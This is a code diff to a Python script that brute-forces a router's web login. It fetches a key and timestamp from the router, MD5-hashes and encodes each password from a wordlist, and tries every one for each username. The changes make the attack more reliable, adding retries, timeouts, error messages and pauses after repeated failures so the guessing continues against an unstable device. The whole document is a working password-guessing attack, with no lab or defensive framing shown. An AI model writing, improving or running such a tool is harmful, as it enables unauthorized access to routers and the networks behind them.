@@ -48,10 +48,26 @@ def load_wordlist(path, batch_size=1000):
             yield pwd
 
 def get_login_info():
-    r = requests.get(login_info_url)
-    data = r.json()
-    priKey, timestamp = data["priKey"].split("x")
-    return priKey, timestamp, int(time.time())
+    for retry in range(3):
+        try:
+            r = requests.get(login_info_url, timeout=5)
+            data = r.json()
+            if not data or "priKey" not in data or not data["priKey"]:
+                raise ValueError("Invalid or empty priKey received from router")
+            
+            parts = data["priKey"].split("x")
+            if len(parts) != 2 or not parts[0]:
+                raise ValueError(f"Invalid priKey format: {data['priKey']}")
+                
+            priKey, timestamp = parts
+            return priKey, timestamp, int(time.time())
+        except Exception as e:
+            print(f"⚠️ Error getting login info: {e} - Attempt {retry+1}/3")
+            if retry < 2:  # Wait before retrying, except on the last attempt
+                time.sleep(2)
+    
+    # If we reach here, all attempts failed
+    raise ConnectionError("Failed to get valid login info after 3 attempts")
 
 def base64_encode_custom(message):
     return base64.b64encode(message.encode()).decode()
@@ -89,9 +105,13 @@ def password_encode(password, secret, timestamp, timestamp_start):
     return base64Str
 
 def try_login(username, raw_password):
-    for _ in range(3):
+    max_retries = 3
+    for attempt in range(max_retries):
         try:
+            # Get login info with retry mechanism built-in
             priKey, timestamp, timestamp_start = get_login_info()
+            
+            # Continue with login attempt
             md5pass = hashlib.md5(raw_password.encode()).hexdigest()
             encoded_pass = password_encode(md5pass, priKey, timestamp, timestamp_start)
 
@@ -106,38 +126,66 @@ def try_login(username, raw_password):
                 return True
             else:
                 return False
+        except ConnectionError as e:
+            # If we can't connect to the router, wait longer before retry
+            if attempt < max_retries - 1:
+                print(f"⚠️ Connection error with {username}:{raw_password} — {e} — waiting...")
+                time.sleep(5)  # Longer wait for connection issues
         except Exception as e:
-            print(f"⚠️ Error with {username}:{raw_password} — {e} — retrying...")
-            time.sleep(2)
+            if attempt < max_retries - 1:
+                print(f"⚠️ Error with {username}:{raw_password} — {e} — retrying...")
+                time.sleep(2)
+    
+    # If we reach here, all attempts failed
+    print(f"❌ Skipping {username}:{raw_password} after {max_retries} failed attempts")
     return False
 
 # Main execution
 if __name__ == "__main__":
     start_time = time.time()
     attempts = 0
+    failed_count = 0
     
     # Count total passwords for progress tracking
-    total_passwords = count_lines(password_path)
+    try:
+        total_passwords = count_lines(password_path)
+    except Exception as e:
+        print(f"Error counting passwords: {e}")
+        total_passwords = 0  # Will show ? in progress bar if unknown
     
     for username in usernames:
         # Create progress bar for brute force attempts
         with tqdm(total=total_passwords, desc=f"Brute forcing {username}", unit="pwd") as pbar:
             for password in load_wordlist(password_path):
                 attempts += 1
-                result = try_login(username, password)
                 
-                if result:
-                    tqdm.write(f"✅ SUCCESS: {username}:{password}")
-                    elapsed = time.time() - start_time
-                    tqdm.write(f"Found after {attempts} attempts in {elapsed:.2f} seconds")
-                    exit(0)
-                else:
-                    if attempts % 10 == 0:  # Only update display occasionally to reduce overhead
+                try:
+                    result = try_login(username, password)
+                    
+                    if result:
+                        tqdm.write(f"✅ SUCCESS: {username}:{password}")
                         elapsed = time.time() - start_time
-                        rate = attempts / elapsed if elapsed > 0 else 0
-                        tqdm.write(f"❌ Failed: {username}:{password} | {rate:.2f} attempts/sec")
+                        tqdm.write(f"Found after {attempts} attempts in {elapsed:.2f} seconds")
+                        exit(0)
+                    else:
+                        failed_count += 1
+                        if attempts % 10 == 0:  # Only update display occasionally to reduce overhead
+                            elapsed = time.time() - start_time
+                            rate = attempts / elapsed if elapsed > 0 else 0
+                            tqdm.write(f"❌ Failed: {username}:{password} | {rate:.2f} attempts/sec")
                 
+                except Exception as e:
+                    failed_count += 1
+                    tqdm.write(f"❌ Unhandled error: {e}")
+                
+                # Always update progress bar
                 pbar.update(1)
+                
+                # If too many consecutive failures, add a delay to avoid overwhelming the router
+                if failed_count > 20:
+                    tqdm.write("⚠️ Too many consecutive failures, pausing for 10 seconds...")
+                    time.sleep(10)
+                    failed_count = 0
             
     print(f"Exhausted wordlist. Tried {attempts} passwords in {time.time() - start_time:.2f} seconds")
         
